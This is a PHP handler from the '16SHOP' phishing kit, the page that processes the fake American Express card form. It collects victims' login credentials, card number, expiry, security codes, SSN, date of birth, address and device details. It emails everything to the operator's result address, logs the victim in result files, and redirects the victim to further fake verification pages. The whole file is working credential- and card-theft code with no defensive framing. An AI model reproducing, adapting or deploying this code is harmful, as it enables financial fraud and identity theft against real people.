<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
if($_POST['cc1'] == "") {
	exit();
}
$ip = getUserIP();
$bin = check_bin($_POST['cc1']);
$message  = "#--------------------[ 16SHOP - AMEX ]-------------------------#\n";
$message .= "User ID		: ".$_SESSION['UserID']."\n";
$message .= "Password		: ".$_SESSION['password']."\n";
$message .= "#--------------------------------[ CARD DETAILS ]----------------------------#\n";
$message .= "Type			: ".strtoupper($bin["scheme"])." - ".strtoupper($bin["type"])."\n";
$message .= "Level			: ".strtoupper($bin["brand"])."\n";
$message .= "Cardholders    : ".$_POST['fullname']."\n";
$message .= "CC Number		: ".$_POST['cc1']."\n";
$message .= "Expired		: ".$_POST['exp_month']."/".$_POST['exp_year']."\n";
$message .= "Card Security Code	: ".$_POST['cvv']."\n";
$message .= "4-Digits Card : ".$_POST['cvv2']."\n";
$message .= "Copy Check Live : ".$_POST['cc1']."|".$_POST['exp_month']."|".$_POST['exp_year']."\n";
$message .= "#-------------------------[ BILLING ADDRESS ]--------------------------------#\n";
$message .= "Full Name		: ".$_POST['fullname']."\n";
$message .= "Address		: ".$_POST['address']."\n";
$message .= "City			: ".$_POST['city']."\n";
$message .= "State			: ".$_POST['state']."\n";
$message .= "Country		: ".$_POST['country']."\n";
$message .= "Zip			: ".$_POST['zipcode']."\n";
$message .= "DOB			: ".$_POST['tanggal']."/".$_POST['bulan']."/".$_POST['tahun']."\n";
$message .= "SSN			: ".$_POST['ssn']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$bin_angka = $_POST['cc1'];
$type = strtoupper($bin["type"]);
$level = strtoupper($bin["brand"]);
$bankname = strtoupper($bin["bank"]["name"]);
$bin_angka = substr($bin_angka,0,6);
if($bankname == "") {
	$bankname = "AMERICAN EXPRESS";
}
if(strlen($_POST['cc1']) < 15) {
echo "<script type='text/javascript'>window.top.location='verification?request_type=LogonHandler&Face=en_US&key=$key';</script>";
exit();
}
if(strlen($_POST['cvv']) < 3) {
echo "<script type='text/javascript'>window.top.location='verification?request_type=LogonHandler&Face=en_US&key=$key';</script>";
exit();
}
if(strlen($_POST['cvv2']) < 4) {
echo "<script type='text/javascript'>window.top.location='verification?request_type=LogonHandler&Face=en_US&key=$key';</script>";
exit();
}
$subject = $bin_angka." - $type $level $bankname [ $cn - $os - $ip ]";
$subbin = $bin_angka." - $type $level $bankname";
kirim_mail($setting['email_result'], $_POST['fullname'], $subject, $message);
tulis_file("../result/total_cc.txt","$ip");
tulis_file("../result/total_bin.txt","$subbin|$countrycode|$countryname|$os\n");
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Mengisi Credit Card");
echo "<script type='text/javascript'>window.top.location='link_email?request_type=LogonHandler&Face=en_US&key=$key';</script>";